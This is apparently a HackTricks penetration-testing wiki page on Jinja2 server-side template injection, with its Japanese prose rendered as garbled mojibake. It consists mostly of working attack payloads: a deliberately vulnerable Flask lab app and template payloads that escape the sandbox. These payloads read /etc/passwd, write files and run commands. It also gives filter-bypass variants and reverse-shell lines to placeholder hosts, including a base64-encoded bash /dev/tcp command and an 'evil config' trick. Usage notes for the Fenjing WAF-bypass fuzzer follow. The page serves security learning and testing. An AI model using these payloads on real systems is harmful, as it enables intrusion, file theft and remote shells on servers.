# Jinja2 SSTI

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## **ãƒ©ãƒœ**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **Misc**

### **ãƒ‡ãƒãƒƒã‚°ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ**

Debug ExtensionãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ç¾åœ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚„åˆ©ç”¨å¯èƒ½ãªãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¨ãƒ†ã‚¹ãƒˆã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ãŸã‚ã®`debug`ã‚¿ã‚°ãŒåˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒãƒƒã‚¬ã‚’è¨­å®šã›ãšã«ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨ã§ãã‚‹ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ã€‚
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}






</pre>
```
### **ã™ã¹ã¦ã®è¨­å®šå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinja Injection**

ã¾ãšç¬¬ä¸€ã«ã€Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰è„±å‡ºã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹**å¿…è¦ãŒã‚ã‚Šã€é€šå¸¸ã®Pythonå®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’å›å¾©ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªéã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**æ‚ªç”¨ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

ä¾‹ãˆã°ã€ã‚³ãƒ¼ãƒ‰`render_template("hello.html", username=username, email=email)`ã§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆusernameã¨emailã¯**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã®Pythonç’°å¢ƒã‹ã‚‰æ¥ã¦ãŠã‚Š**ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒå†…ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã™ã€‚\
ã•ã‚‰ã«ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã‹ã‚‰å¸¸ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãª**ä»–ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯:
```
[]
''
()
dict
config
request
```
### Recovering \<class 'object'>

æ¬¡ã«ã€ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã€å®šç¾©ã•ã‚ŒãŸ**ã‚¯ãƒ©ã‚¹**ã‚’**å›å¾©**ã™ã‚‹ãŸã‚ã«ã€**`<class 'object'>`**ã«åˆ°é”ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰**`__subclasses__`**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã—ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚Œã¦ã„ãªã„**pythonç’°å¢ƒã®ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¹ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã‚‹ãŸã‚ã§ã™ã€‚

ãã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ¬¡ã«**`__base__`**ã€**`__mro__()[-1]`**ã¾ãŸã¯**`mro()[-1]`**ã®ã„ãšã‚Œã‹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã—ã¦ã€**ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹**ã«åˆ°é”ã—ãŸå¾Œã€**`__subclasses__()`**ã‚’**å‘¼ã³å‡ºã—ã¾ã™**ã€‚

ã“ã‚Œã‚‰ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}




# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE Escaping

**å›å¾©ã—ãŸ** `<class 'object'>` ã¨ `__subclasses__` ã‚’å‘¼ã³å‡ºã—ãŸã“ã¨ã§ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿æ›¸ãã—ãŸã‚Šã€ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã™ã‚‹ãŸã‚ã«ã“ã‚Œã‚‰ã®ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚

`__subclasses__` ã®å‘¼ã³å‡ºã—ã«ã‚ˆã‚Šã€**æ•°ç™¾ã®æ–°ã—ã„é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ©Ÿä¼š**ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚ç§ãŸã¡ã¯ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã‚¯ãƒ©ã‚¹**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿æ›¸ãã™ã‚‹**ã“ã¨ã‚„ã€**ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹ã‚¯ãƒ©ã‚¹**ï¼ˆä¾‹ãˆã° `os`ï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§æº€è¶³ã—ã¾ã™ã€‚

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ã**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```
**ã‚ˆã‚Šå¤šãã®ã‚¯ãƒ©ã‚¹**ã‚’ä½¿ç”¨ã—ã¦**ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€**ç¢ºèª**ã§ãã¾ã™ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãƒã‚¤ãƒ‘ã‚¹

#### ä¸€èˆ¬çš„ãªãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã¯ã€**ã„ãã¤ã‹ã®æ–‡å­—**ã‚’ä½¿ç”¨ã›ãšã«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**å±æ€§**ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚\
ä»¥å‰ã®ä¾‹ã§ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã®ã„ãã¤ã‹ã‚’ã™ã§ã«è¦‹ã¾ã—ãŸãŒã€ã“ã“ã§è¦ç´„ã—ã¾ã™ï¼š
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã“ã¡ã‚‰ã«æˆ»ã£ã¦ãã ã•ã„**](jinja2-ssti.md#accessing-global-objects)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã“ã¡ã‚‰ã«æˆ»ã£ã¦ãã ã•ã„**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ãªã—ã§RCEã‚’å–å¾—ã™ã‚‹ã«ã¯ã“ã‚Œã‚’èª­ã‚“ã§ãã ã•ã„**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®å›é¿**

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Flaskã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®ã™ã¹ã¦ã‚’HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¾ã™:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒšãƒ¼ã‚¸ã«JavaScriptã‚„HTMLã‚’**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰**ã•ã‚Œã‚‹ã“ã¨ãªãæ³¨å…¥ã§ãã¾ã™ã€‚æ¬¡ã®ã‚ˆã†ã«:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**æ‚ªæ„ã®ã‚ã‚‹è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ã„ã¦RCEã‚’å®Ÿè¡Œã™ã‚‹ã€‚**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## ã„ãã¤ã‹ã®æ–‡å­—ãªã—

Without **`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}




```
## Jinja Injection without **\<class 'object'>**

[**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**](jinja2-ssti.md#accessing-global-objects)ã‹ã‚‰ã€**ãã®ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã›ãšã«RCEã«åˆ°é”ã™ã‚‹**åˆ¥ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰**é–¢æ•°**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚Œã°ã€**`__globals__.__builtins__`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã€ãã“ã‹ã‚‰**RCE**ã¯éå¸¸ã«**ç°¡å˜**ã§ã™ã€‚

**`request`**ã€**`config`**ã€ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãª**ä»–ã®**èˆˆå‘³æ·±ã„**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã‹ã‚‰**é–¢æ•°**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
ä¸€åº¦ã„ãã¤ã‹ã®é–¢æ•°ã‚’è¦‹ã¤ã‘ãŸã‚‰ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¦ãƒ“ãƒ«ãƒˆã‚¤ãƒ³ã‚’å¾©å…ƒã§ãã¾ã™:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}


## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
### Fuzzing WAF bypass

**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) ã¯ã€CTFã«ç‰¹åŒ–ã—ãŸãƒ„ãƒ¼ãƒ«ã§ã™ãŒã€å®Ÿéš›ã®ã‚·ãƒŠãƒªã‚ªã§ç„¡åŠ¹ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã®ã«ã‚‚å½¹ç«‹ã¡ã¾ã™ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«å˜èªã‚„ã‚¯ã‚¨ãƒªã‚’ã‚¹ãƒ—ãƒ¬ãƒ¼ã—ã€ãƒã‚¤ãƒ‘ã‚¹ã‚’æ¢ã—ã€ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãªã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚‚æä¾›ã—ã¾ã™ã€‚
```
webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
```
## å‚è€ƒæ–‡çŒ®

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [ã“ã“ã§ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«è¼‰ã£ã¦ã„ã‚‹æ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®attrãƒˆãƒªãƒƒã‚¯ã‚’ç¢ºèªã—ã¦ãã ã•ã„](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
